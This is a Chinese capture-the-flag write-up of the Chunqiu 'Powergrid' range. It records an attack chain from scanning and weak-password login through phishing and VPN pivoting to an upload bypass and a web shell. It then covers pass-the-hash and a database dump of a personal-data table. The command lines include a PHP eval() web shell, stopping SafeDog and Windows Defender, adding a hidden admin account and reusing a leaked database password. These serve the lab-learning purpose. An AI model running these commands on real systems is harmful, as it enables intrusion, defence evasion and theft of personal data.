# WP | 春秋云境靶场Powergrid

> 原文: https://www.ctfiot.com/299107.html
> ID: 299107

特别致谢 C1trus 师傅

对春秋云境靶场Powergrid的探索

以及WP的无私分享！

“Powergrid” 介绍

春秋云境.com靶场Powergrid，高度还原真实攻击链路全流程，专为关键业务系统安全实战演练而设计。玩家需从外围信息收集与弱口令爆破入手，逐步完成Web打点、办公网到生产控制区横向渗透、核心业务系统权限获取与敏感数据窃取等攻击链路，攻防场景紧贴行业实际，最终获取全部5个flag作为目标进行提交。

unsetunset1. flag1unsetunset

1.1. 信息收集

┌──(root㉿kali)-[~/Desktop/ChunQiu/powergrid]
└─# nmap  121.89.87.130 -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-09 01:36 EST
Nmap scan report for 121.89.81.60
Host is up (0.050s latency).
Not shown: 989 closed tcp ports (reset)
PORT    STATE    SERVICE
22/tcp  open     ssh
25/tcp  open     smtp
80/tcp  open     http
110/tcp open     pop3
143/tcp open     imap
443/tcp open     https
445/tcp filtered microsoft-ds
465/tcp open     smtps
587/tcp open     submission
993/tcp open     imaps
995/tcp open     pop3s

Nmap done: 1 IP address (1 host up) scanned in 46.94 seconds

┌──(root㉿kali)-[~/Desktop/ChunQiu/powergrid]
└─# nmap 8.145.53.252 -p- --min-rate 10000
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-09 01:35 EST
Not shown: 62070 filtered tcp ports (no-response), 3462 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
443/tcp  open  https
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 72.16 seconds

注：第一台机器有waf，扫快了会永久封ip，只能换ip或者重置机器

扫目录不会触发waf

┌──(root㉿kali)-[~/Desktop/ChunQiu/powergrid]
└─# dirsearch -u http://121.89.87.130:
8080/ -x 403,404

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /root/Desktop/ChunQiu/powergrid/reports/http_121.89.87.130_8080/__26-02-09_08-13-10.txt

Target: http://121.89.87.130:
8080/

[08:13:10] Starting:
[08:13:23] 400 -  800B  - /..................etcpasswd
[08:13:24] 400 -  800B  - /a%5c.aspx
[08:13:48] 200 -   66KB - /favicon.ico
[08:13:52] 200 -    5KB - /index.html
[08:13:56] 302 -    0B  - /logout  ->  http://121.89.87.130:
8080/login?logout
[08:14:12] 200 -   90B  - /swagger-resources
[08:14:16] 200 -  135B  - /v2/api-docs

Task Completed

1.2. 弱口令

可以用弱口令 admin 123456 登录

unsetunset2. flag2unsetunset

能收集到邮箱信息

2.1. 邮件钓鱼

入口1可以使用收集到的邮箱加弱口令登录zs@powergrid.com 123456

然后发带有恶意exe附件的邮件给管理员（需要做免杀）

这里需要等几分钟才能上线

直接就是管理员，抓hash 然后直接改管理员密码rdp上去

net user Administrator Admin123

2.2. vpn

在桌面的vpn文件夹下可以发现opvn和对应的密码

尝试连接但是连不上，报错显示VPN服务器 172.16.200.87 无法通信

┌──(root㉿kali)-[~/Desktop/ChunQiu/powergrid]
└─# openvpn zhangsan.ovpn
2026-02-09 08:27:43 DEPRECATED OPTION: --cipher set to 'AES-256-CBC' but missing in --data-ciphers (AES-256-GCM:
AES-128-GCM:
CHACHA20-POLY1305). OpenVPN ignores --cipher for cipher negotiations.
2026-02-09 08:27:43 Note: Kernel support for ovpn-dco missing, disabling data channel offload.
2026-02-09 08:27:43 OpenVPN 2.6.13 x86_64-pc-linux-gnu [SSL (OpenSSL)] [LZO] [LZ4] [EPOLL] [PKCS11] [MH/PKTINFO] [AEAD] [DCO]
2026-02-09 08:27:43 library versions: OpenSSL 3.5.4 30 Sep 2025, LZO 2.10
2026-02-09 08:27:43 DCO version: N/A
Enter Auth Username: zhangsan
Enter Auth Password: ••••••••••••••••
2026-02-09 08:27:51 TCP/UDP: Preserving recently used remote address: [AF_INET]172.16.200.87:
1194
2026-02-09 08:27:51 Socket Buffers: R=[212992->212992] S=[212992->212992]
2026-02-09 08:27:51 UDPv4 link local: (not bound)
2026-02-09 08:27:51 UDPv4 link remote: [AF_INET]172.16.200.87:
1194
2026-02-09 08:27:55 Server poll timeout, restarting
2026-02-09 08:27:55 SIGUSR1[soft,server_poll] received, process restarting
2026-02-09 08:27:55 TCP/UDP: Preserving recently used remote address: [AF_INET]172.16.200.87:
1194
2026-02-09 08:27:55 Socket Buffers: R=[212992->212992] S=[212992->212992]
2026-02-09 08:27:55 UDPv4 link local: (not bound)
2026-02-09 08:27:55 UDPv4 link remote: [AF_INET]172.16.200.87:
1194
2026-02-09 08:27:59 Server poll timeout, restarting
2026-02-09 08:27:59 SIGUSR1[soft,server_poll] received, process restarting
2026-02-09 08:27:59 TCP/UDP: Preserving recently used remote address: [AF_INET]172.16.200.87:
443
2026-02-09 08:27:59 Socket Buffers: R=[131072->131072] S=[16384->16384]
2026-02-09 08:27:59 Attempting to establish TCP connection with [AF_INET]172.16.200.87:
443
^C2026-02-09 08:27:59 SIGINT[hard,init_instance] received, process exiting

把这个vpn服务器的内网IP改成外网入口IP即可连上

连上后给我们分配了一个172.27.236.3的ip

15: tun0:  mtu 1420 qdisc fq_codel state UNKNOWN group default qlen 500    link/none
    inet 172.27.236.3/22 scope global tun0
       valid_lft forever preferred_lft forever
    inet6 fe80::
b8f0:
cb7a:
a44c:
7c88/64 scope link stable-privacy proto kernel_ll
       valid_lft forever preferred_lft forever

unsetunset3. flag3unsetunset

3.1. 主机发现

┌──(root㉿kali)-[~/Desktop/ChunQiu/powergrid]
└─# fping -agq 172.27.236.3、24

┌──(root㉿kali)-[~/Desktop/ChunQiu/powergrid]
└─# fping -agq 172.16.200.0/24
172.16.200.76
172.16.200.78
172.16.200.81
172.16.200.87

我们这个27网段没有主机，尝试探测vpn服务器处于的16.200网段，可以发现4台机器

然后扫一下端口

┌──(root㉿kali)-[~/Desktop/ChunQiu/powergrid]
└─# nmap 172.16.200.87 -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-09 08:34 EST
Nmap scan report for 172.16.200.87
Host is up (0.055s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
443/tcp  open  https
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 6.53 seconds

┌──(root㉿kali)-[~/Desktop/ChunQiu/powergrid]
└─# nmap 172.16.200.81 -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-09 08:34 EST
Nmap scan report for 172.16.200.81
Host is up (0.055s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
3306/tcp open  mysql

Nmap done: 1 IP address (1 host up) scanned in 6.51 seconds

┌──(root㉿kali)-[~/Desktop/ChunQiu/powergrid]
└─# nmap 172.16.200.78 -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-09 08:34 EST
Nmap scan report for 172.16.200.78
Host is up (0.056s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
8080/tcp open  http-proxy

┌──(root㉿kali)-[~/Desktop/ChunQiu/powergrid]
└─# nmap 172.16.200.76 -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-09 08:35 EST
Stats: 0:00:20 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 68.70% done; ETC: 08:35 (0:00:07 remaining)
Stats: 0:00:36 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 75.90% done; ETC: 08:35 (0:00:10 remaining)

172.16.200.76 有waf，会被ban，ban了后要好几分钟才能恢复正常

恢复后对172.16.200.76只做一些常见的端口探测

┌──(root㉿kali)-[~/Desktop/ChunQiu/powergrid]
└─# nmap 172.16.200.76 -Pn -p 22,80,443,8080,3389
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-09 08:48 EST
Nmap scan report for 172.16.200.76
Host is up (0.049s latency).

PORT     STATE  SERVICE
22/tcp   closed ssh
80/tcp   open   http
443/tcp  closed https
3389/tcp open   ms-wbt-server
8080/tcp closed http-proxy

Nmap done: 1 IP address (1 host up) scanned in 5.63 seconds

目标是一台windows，有web服务

和入口机1一样，扫目录是不会被ban的

┌──(root㉿kali)-[~/Desktop/ChunQiu/powergrid]
└─# dirsearch -u 172.16.200.76 -x 403,404

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /root/Desktop/ChunQiu/powergrid/reports/_172.16.200.76/_26-02-09_08-49-22.txt

Target: http://172.16.200.76/

[08:49:22] Starting:
[08:49:23] 301 -  232B  - /js  ->  http://172.16.200.76/js/
[08:49:34] 500 -  661B  - /cgi-bin/printenv.pl
[08:49:35] 301 -  233B  - /css  ->  http://172.16.200.76/css/
[08:49:52] 301 -  237B  - /uploads  ->  http://172.16.200.76/uploads/
[08:49:53] 200 -    1KB - /upload.php

Task Completed

3.2. 文件上传

只能上传图片类型的经过测试，只要抓包改一下文件后缀即可绕过

但是当我写入一个一句话木马时，发现无法正常解析

猜测可能是有杀软，但我这里传了一个https://github.com/flozz/p0wny-shell 发现他竟然没有杀???直接就是system用户，然后看了一下进程有安全狗，还有df。

https://av8.de5.net/

我先尝试添加了一个用户，但是rdp上不去

net user c1trus Admin123 /add
net localgroup administrators c1trus /add

这里可以改管理员密码然后rdp上去，但密码改了hash也会变。那你只能重置机器了，因为第三题要你提交管理员的hash

这里把杀软关了

net stop SafeDogGuardCenter
net stop "Safedog Update Center"
net stop SafeDogCloudHelper
taskkill /F /PID 2672
taskkill /F /PID 2576
taskkill /F /PID 2684
taskkill /F /PID 8620

powershell -c "Set-MpPreference -DisableRealtimeMonitoring $true"
net stop WinDefend
net stop WdNisSvc

然后写一个一句话后门

powershell -c "Set-Content -Path gsl.php -Value '<?php eval($_POST["pass"]);'"

哥斯拉连接，传一个正向后门（反向我没试过）。cs连接

connect 172.16.200.76 12345

抓hash

unsetunset4. flag04unsetunset

4.1. pth

┌──(root㉿kali)-[~/Desktop/ChunQiu/powergrid]
└─# nxc smb 172.16.200.78  -u administrator -H da6df19610xxxxxxxxxxxxxxxx
SMB         172.16.200.78   445    DATA             [*] Windows Server 2016 Datacenter 14393 x64 (name:
DATA) (domain:
data) (signing:
False) (SMBv1:
True)
SMB         172.16.200.78   445    DATA             [+] dataadministrator:
da6df1961007xxxxxxxxxxxxxxxxxxx (Pwn3d!)

尝试rdp失败

xfreerdp /v:
172.16.200.78 /u:
administrator /pth:
da6df1961007axxxxxxxxxxxxx /cert:
ignore /drive:
share,/tmp +clipboard

改用wimiexec

┌──(root㉿kali)-[~/Desktop/ChunQiu/powergrid]
└─# impacket-wmiexec administrator@172.16.200.78 -hashes :
da6df196100xxxxxxxxxxxxxxxxx -codec gbk
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:>reg add "HKLMSystemCurrentControlSetControlLsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f
操作成功完成。

C:>type C:
usersadministratorflagflag.txt
flag{548fxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxb}

看一下目录有什么

dc:
usersadministrator>tree . /f /a
文件夹 PATH 列表
卷序列号为 00000244 8E66:
8577
C:
USERSADMINISTRATOR
+---.sdb
|       jdbctrace.shm
|
+---Contacts
+---Desktop
|   ---larkmt-admin
|       +---bin
|       |       bat_readme.md
|       |       configure.sh
|       |       env.properties
|       |       larkmt-admin.bat
|       |       larkmt-admin.sh
|       |       nssm.exe
|       |
|       +---conf
|       |   |   application.yml
|       |   |   logback.xml
|
+---Documents
|   ---WindowsPowerShell
|       ---Scripts
|           ---InstalledScriptInfos
+---Downloads
+---Favorites
|   ---Links
+---flag
|       flag.txt
|
...<SNIP>...

unsetunset5. flag5unsetunset

5.1. mysql

在C:
UsersAdministratorDesktoplarkmt-adminconfapplication.yml 发现数据库密码

server:
  port: 8080

spring:
  #数据源
  datasource:
    username: root
    password: rjS8K2RW7KE4E1vk
    url: jdbc:
mysql://172.16.200.81:
3306/web?serverTimezone=Asia/Shanghai&useLegacyDatetimeCode=false&useSSL=false&nullNamePatternMatchesAll=true&useUnicode=true&characterEncoding=UTF-8
    
...<SNIP>...

┌──(root㉿kali)-[~/Desktop/ChunQiu/powergrid]
└─# mysql -h 172.16.200.81 -u root -p'rjS8K2RW7KE4E1vk' --skip-ssl web
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MariaDB monitor.  Commands end with ; or g.
Your MySQL connection id is 14
Server version: 5.7.44 MySQL Community Server (GPL)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Support MariaDB developers by giving a star at https://github.com/MariaDB/server
Type 'help;' or 'h'forhelp. Type 'c' to clear the current input statement.

MySQL [web]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| web                |
+--------------------+
5 rows inset (0.048 sec)

MySQL [web]> use web;
Database changed
MySQL [web]> show tables;
+---------------------+
| Tables_in_web       |
+---------------------+
| job_group           |
| job_info            |
| job_jdbc_datasource |
| job_lock            |
| job_log             |
| job_log_report      |
| job_logglue         |
| job_permission      |
| job_project         |
| job_registry        |
| job_template        |
| job_user            |
| job_user_datas      |
+---------------------+
13 rows inset (0.048 sec)

MySQL [web]> select count(*) from job_user_datas;
+----------+
| count(*) |
+----------+
|    xxxx |
+----------+
1 row inset (0.059 sec)

MySQL [web]> select * from job_user_datas limit 10;
+----+-----------+-------------+--------------------+---------------------+---------------------+---------------------+
| id | name      | phone       | id_card            | bank_card           | created_at          | updated_at          |
+----+-----------+-------------+--------------------+---------------------+---------------------+---------------------+
.......
10 rows inset (0.049 sec)

┌──(root㉿kali)-[~/Desktop/ChunQiu/powergrid]
└─# echo -n "job_user_datasxxxxx" | md5sum
212c1xxxxxxxxxxxxxxxxxxxxxxxx  -

flag{212c13xxxxxxxxxxxxxxxxx}

欢迎热爱打靶机的朋友加入MazeSec官方Q群

赛事交流群

了解更多关于春秋GAME的信息，可加入春秋赛事宇宙专属微信群。在这里，您不仅能了解到最新的赛事资讯，还能结识一群志同道合、热爱比赛的学习伙伴。我们期待您的加入，一起成长、共同进步！

（添加管理员，申请入群）


```
┌──(root㉿kali)-[~/Desktop/ChunQiu/powergrid]
└─# nmap  121.89.87.130 -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-09 01:36 EST
Nmap scan report for 121.89.81.60
Host is up (0.050s latency).
Not shown: 989 closed tcp ports (reset)
PORT    STATE    SERVICE
22/tcp  open     ssh
25/tcp  open     smtp
80/tcp  open     http
110/tcp open     pop3
143/tcp open     imap
443/tcp open     https
445/tcp filtered microsoft-ds
465/tcp open     smtps
587/tcp open     submission
993/tcp open     imaps
995/tcp open     pop3s

Nmap done: 1 IP address (1 host up) scanned in 46.94 seconds

┌──(root㉿kali)-[~/Desktop/ChunQiu/powergrid]
└─# nmap 8.145.53.252 -p- --min-rate 10000
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-09 01:35 EST
Not shown: 62070 filtered tcp ports (no-response), 3462 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
443/tcp  open  https
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 72.16 seconds
┌──(root㉿kali)-[~/Desktop/ChunQiu/powergrid]
└─# dirsearch -u http://121.89.87.130:
8080/ -x 403,404

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /root/Desktop/ChunQiu/powergrid/reports/http_121.89.87.130_8080/__26-02-09_08-13-10.txt

Target: http://121.89.87.130:
8080/

[08:13:10] Starting:
[08:13:23] 400 -  800B  - /..................etcpasswd
[08:13:24] 400 -  800B  - /a%5c.aspx
[08:13:48] 200 -   66KB - /favicon.ico
[08:13:52] 200 -    5KB - /index.html
[08:13:56] 302 -    0B  - /logout  ->  http://121.89.87.130:
8080/login?logout
[08:14:12] 200 -   90B  - /swagger-resources
[08:14:16] 200 -  135B  - /v2/api-docs

Task Completed
net user Administrator Admin123
┌──(root㉿kali)-[~/Desktop/ChunQiu/powergrid]
└─# openvpn zhangsan.ovpn
2026-02-09 08:27:43 DEPRECATED OPTION: --cipher set to 'AES-256-CBC' but missing in --data-ciphers (AES-256-GCM:
AES-128-GCM:
CHACHA20-POLY1305). OpenVPN ignores --cipher for cipher negotiations.
2026-02-09 08:27:43 Note: Kernel support for ovpn-dco missing, disabling data channel offload.
2026-02-09 08:27:43 OpenVPN 2.6.13 x86_64-pc-linux-gnu [SSL (OpenSSL)] [LZO] [LZ4] [EPOLL] [PKCS11] [MH/PKTINFO] [AEAD] [DCO]
2026-02-09 08:27:43 library versions: OpenSSL 3.5.4 30 Sep 2025, LZO 2.10
2026-02-09 08:27:43 DCO version: N/A
Enter Auth Username: zhangsan
Enter Auth Password: ••••••••••••••••
2026-02-09 08:27:51 TCP/UDP: Preserving recently used remote address: [AF_INET]172.16.200.87:
1194
2026-02-09 08:27:51 Socket Buffers: R=[212992->212992] S=[212992->212992]
2026-02-09 08:27:51 UDPv4 link local: (not bound)
2026-02-09 08:27:51 UDPv4 link remote: [AF_INET]172.16.200.87:
1194
2026-02-09 08:27:55 Server poll timeout, restarting
2026-02-09 08:27:55 SIGUSR1[soft,server_poll] received, process restarting
2026-02-09 08:27:55 TCP/UDP: Preserving recently used remote address: [AF_INET]172.16.200.87:
1194
2026-02-09 08:27:55 Socket Buffers: R=[212992->212992] S=[212992->212992]
2026-02-09 08:27:55 UDPv4 link local: (not bound)
2026-02-09 08:27:55 UDPv4 link remote: [AF_INET]172.16.200.87:
1194
2026-02-09 08:27:59 Server poll timeout, restarting
2026-02-09 08:27:59 SIGUSR1[soft,server_poll] received, process restarting
2026-02-09 08:27:59 TCP/UDP: Preserving recently used remote address: [AF_INET]172.16.200.87:
443
2026-02-09 08:27:59 Socket Buffers: R=[131072->131072] S=[16384->16384]
2026-02-09 08:27:59 Attempting to establish TCP connection with [AF_INET]172.16.200.87:
443
^C2026-02-09 08:27:59 SIGINT[hard,init_instance] received, process exiting
15: tun0:  mtu 1420 qdisc fq_codel state UNKNOWN group default qlen 500    link/none
    inet 172.27.236.3/22 scope global tun0
       valid_lft forever preferred_lft forever
    inet6 fe80::
b8f0:
cb7a:
a44c:
7c88/64 scope link stable-privacy proto kernel_ll
       valid_lft forever preferred_lft forever
┌──(root㉿kali)-[~/Desktop/ChunQiu/powergrid]
└─# fping -agq 172.27.236.3、24

┌──(root㉿kali)-[~/Desktop/ChunQiu/powergrid]
└─# fping -agq 172.16.200.0/24
172.16.200.76
172.16.200.78
172.16.200.81
172.16.200.87
┌──(root㉿kali)-[~/Desktop/ChunQiu/powergrid]
└─# nmap 172.16.200.87 -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-09 08:34 EST
Nmap scan report for 172.16.200.87
Host is up (0.055s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
443/tcp  open  https
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 6.53 seconds

┌──(root㉿kali)-[~/Desktop/ChunQiu/powergrid]
└─# nmap 172.16.200.81 -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-09 08:34 EST
Nmap scan report for 172.16.200.81
Host is up (0.055s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
3306/tcp open  mysql

Nmap done: 1 IP address (1 host up) scanned in 6.51 seconds

┌──(root㉿kali)-[~/Desktop/ChunQiu/powergrid]
└─# nmap 172.16.200.78 -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-09 08:34 EST
Nmap scan report for 172.16.200.78
Host is up (0.056s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
8080/tcp open  http-proxy

┌──(root㉿kali)-[~/Desktop/ChunQiu/powergrid]
└─# nmap 172.16.200.76 -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-09 08:35 EST
Stats: 0:00:20 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 68.70% done; ETC: 08:35 (0:00:07 remaining)
Stats: 0:00:36 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 75.90% done; ETC: 08:35 (0:00:10 remaining)
┌──(root㉿kali)-[~/Desktop/ChunQiu/powergrid]
└─# nmap 172.16.200.76 -Pn -p 22,80,443,8080,3389
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-09 08:48 EST
Nmap scan report for 172.16.200.76
Host is up (0.049s latency).

PORT     STATE  SERVICE
22/tcp   closed ssh
80/tcp   open   http
443/tcp  closed https
3389/tcp open   ms-wbt-server
8080/tcp closed http-proxy

Nmap done: 1 IP address (1 host up) scanned in 5.63 seconds
┌──(root㉿kali)-[~/Desktop/ChunQiu/powergrid]
└─# dirsearch -u 172.16.200.76 -x 403,404

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /root/Desktop/ChunQiu/powergrid/reports/_172.16.200.76/_26-02-09_08-49-22.txt

Target: http://172.16.200.76/

[08:49:22] Starting:
[08:49:23] 301 -  232B  - /js  ->  http://172.16.200.76/js/
[08:49:34] 500 -  661B  - /cgi-bin/printenv.pl
[08:49:35] 301 -  233B  - /css  ->  http://172.16.200.76/css/
[08:49:52] 301 -  237B  - /uploads  ->  http://172.16.200.76/uploads/
[08:49:53] 200 -    1KB - /upload.php

Task Completed
net user c1trus Admin123 /add
net localgroup administrators c1trus /add
net stop SafeDogGuardCenter
net stop "Safedog Update Center"
net stop SafeDogCloudHelper
taskkill /F /PID 2672
taskkill /F /PID 2576
taskkill /F /PID 2684
taskkill /F /PID 8620

powershell -c "Set-MpPreference -DisableRealtimeMonitoring $true"
net stop WinDefend
net stop WdNisSvc
powershell -c "Set-Content -Path gsl.php -Value '<?php eval($_POST["pass"]);'"
connect 172.16.200.76 12345
┌──(root㉿kali)-[~/Desktop/ChunQiu/powergrid]
└─# nxc smb 172.16.200.78  -u administrator -H da6df19610xxxxxxxxxxxxxxxx
SMB         172.16.200.78   445    DATA             [*] Windows Server 2016 Datacenter 14393 x64 (name:
DATA) (domain:
data) (signing:
False) (SMBv1:
True)
SMB         172.16.200.78   445    DATA             [+] dataadministrator:
da6df1961007xxxxxxxxxxxxxxxxxxx (Pwn3d!)
xfreerdp /v:
172.16.200.78 /u:
administrator /pth:
da6df1961007axxxxxxxxxxxxx /cert:
ignore /drive:
share,/tmp +clipboard
┌──(root㉿kali)-[~/Desktop/ChunQiu/powergrid]
└─# impacket-wmiexec administrator@172.16.200.78 -hashes :
da6df196100xxxxxxxxxxxxxxxxx -codec gbk
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:>reg add "HKLMSystemCurrentControlSetControlLsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f
操作成功完成。

C:>type C:
usersadministratorflagflag.txt
flag{548fxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxb}
dc:
usersadministrator>tree . /f /a
文件夹 PATH 列表
卷序列号为 00000244 8E66:
8577
C:
USERSADMINISTRATOR
+---.sdb
|       jdbctrace.shm
|
+---Contacts
+---Desktop
|   ---larkmt-admin
|       +---bin
|       |       bat_readme.md
|       |       configure.sh
|       |       env.properties
|       |       larkmt-admin.bat
|       |       larkmt-admin.sh
|       |       nssm.exe
|       |
|       +---conf
|       |   |   application.yml
|       |   |   logback.xml
|
+---Documents
|   ---WindowsPowerShell
|       ---Scripts
|           ---InstalledScriptInfos
+---Downloads
+---Favorites
|   ---Links
+---flag
|       flag.txt
|
...<SNIP>...
server:
  port: 8080

spring:
  #数据源
  datasource:
    username: root
    password: rjS8K2RW7KE4E1vk
    url: jdbc:
mysql://172.16.200.81:
3306/web?serverTimezone=Asia/Shanghai&useLegacyDatetimeCode=false&useSSL=false&nullNamePatternMatchesAll=true&useUnicode=true&characterEncoding=UTF-8
    
...<SNIP>...
┌──(root㉿kali)-[~/Desktop/ChunQiu/powergrid]
└─# mysql -h 172.16.200.81 -u root -p'rjS8K2RW7KE4E1vk' --skip-ssl web
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MariaDB monitor.  Commands end with ; or g.
Your MySQL connection id is 14
Server version: 5.7.44 MySQL Community Server (GPL)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Support MariaDB developers by giving a star at https://github.com/MariaDB/server
Type 'help;' or 'h'forhelp. Type 'c' to clear the current input statement.

MySQL [web]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| web                |
+--------------------+
5 rows inset (0.048 sec)

MySQL [web]> use web;
Database changed
MySQL [web]> show tables;
+---------------------+
| Tables_in_web       |
+---------------------+
| job_group           |
| job_info            |
| job_jdbc_datasource |
| job_lock            |
| job_log             |
| job_log_report      |
| job_logglue         |
| job_permission      |
| job_project         |
| job_registry        |
| job_template        |
| job_user            |
| job_user_datas      |
+---------------------+
13 rows inset (0.048 sec)

MySQL [web]> select count(*) from job_user_datas;
+----------+
| count(*) |
+----------+
|    xxxx |
+----------+
1 row inset (0.059 sec)

MySQL [web]> select * from job_user_datas limit 10;
+----+-----------+-------------+--------------------+---------------------+---------------------+---------------------+
| id | name      | phone       | id_card            | bank_card           | created_at          | updated_at          |
+----+-----------+-------------+--------------------+---------------------+---------------------+---------------------+
.......
10 rows inset (0.049 sec)
┌──(root㉿kali)-[~/Desktop/ChunQiu/powergrid]
└─# echo -n "job_user_datasxxxxx" | md5sum
212c1xxxxxxxxxxxxxxxxxxxxxxxx  -

flag{212c13xxxxxxxxxxxxxxxxx}
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/02/1771034830-wxsync-2026-02-def55aefc4781b2fed0c8147e45d33dc.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/02/1771034832-wxsync-2026-02-8f73a43b70e9736fa5dfef5c62124667.webp)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/02/1771034834-wxsync-2026-02-48c0e339ad79a7956e649bab331c00cc.webp)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/02/1771034835-wxsync-2026-02-955d5901857fd0750a12f56aa44dd7eb.webp)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/02/1771034836-wxsync-2026-02-f7a3f033ce65fd4128b20918baf4c569.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/02/1771034838-wxsync-2026-02-d5314e4465aca020a3a8597e354cb87a.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/02/1771034840-wxsync-2026-02-7d82143635b8cd630b723bef84043af9.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/02/1771034842-wxsync-2026-02-b3160d5f21ee7c265be4479d286e0973.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/02/1771034843-wxsync-2026-02-71660ffc8a16fbb0a08dc9c674d73e72.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/02/1771034845-wxsync-2026-02-be35e2c2d6aa5e66d1e17f6e119b068d.png)